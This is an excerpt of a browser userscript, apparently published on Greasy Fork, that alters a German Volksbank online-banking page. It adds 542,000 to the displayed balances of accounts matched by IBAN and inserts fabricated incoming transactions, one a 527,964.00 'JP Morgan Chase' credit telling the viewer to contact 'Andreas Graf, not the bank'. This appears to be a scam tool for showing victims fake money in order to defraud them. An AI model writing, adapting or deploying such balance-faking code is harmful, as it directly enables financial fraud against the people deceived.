// ==UserScript==
// @name         Ed Commerz NEW Peter KLuzik
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/484274/Ed%20Commerz%20NEW%20Peter%20KLuzik.user.js
// @updateURL https://update.greasyfork.org/scripts/484274/Ed%20Commerz%20NEW%20Peter%20KLuzik.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  542000},
        { index: 1, adjustmentAmount: 542000},
        { index: 2, adjustmentAmount: 542000},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE44 7016 9598";
    var targetTextContent2 = " 0000 6014 54";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 542000.0; // Adjust the amount as needed
...
//            amount: '3.500,00',
 ...
 //      {
//            title: 'JP Morgan Chase',
///            description: 'Geld von dem Zahlungsanbieter',
//           amount: '5.000,00',
//            date: 'Heute',
//            insertAfter: false, // Set to false to insert before the original transaction
 //           moveSteps: 1, // Number of steps to move the transaction
...
//       },
        {
           ...
           {
          title: 'JP Morgan Chase',
           description: 'Wenden Sie sich an Andreas Graf, nicht die Bank, damit nicht gesperrt.',
           amount: '527.964,00',
           date: 'Heute',
           moveSteps: 1, // Number of steps to move the transaction
           moveDirectionDown: false, // Set to false to move up
